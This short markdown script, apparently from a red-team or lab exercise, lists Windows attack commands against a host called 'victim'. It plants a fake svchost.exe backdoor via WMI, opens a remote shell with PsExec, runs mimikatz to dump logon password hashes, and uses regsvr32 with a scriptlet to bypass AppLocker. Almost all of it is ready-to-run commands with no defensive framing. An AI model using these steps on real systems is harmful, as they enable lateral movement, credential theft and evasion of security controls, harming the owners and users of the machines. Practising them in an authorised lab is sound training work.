# Script

## Use WMI to build a backdoor
```
wmic /node:"victim" process call create "cmd.exe /c copy c:\windows\system32\svchost.exe c:\malicious\svchost.exe"
wmic /node:"victim" process call create "cmd.exe /c c:\malicious\svchost.exe" 
```

## Start a remote shell on the victim, verify by running ```hostname``` and start mimikatz
```
c:\tools\psexec\PsExec.exe /accepteula \\victim cmd
hostname
c:\tools\mimikatz\x64\mimikatz
```

## In mimikatz execute the following commands and verify if the hashes are visible
```
privilege::debug
sekurlsa::logonpasswords
exit
```

## Use regsvr32 to run arbitrary code on the victim and bypass AppLocker (while in the remove shell)
```
cd c:\malicious
regsvr32.exe /s /u /i:C:\tools\test.sct scrobj.dll
```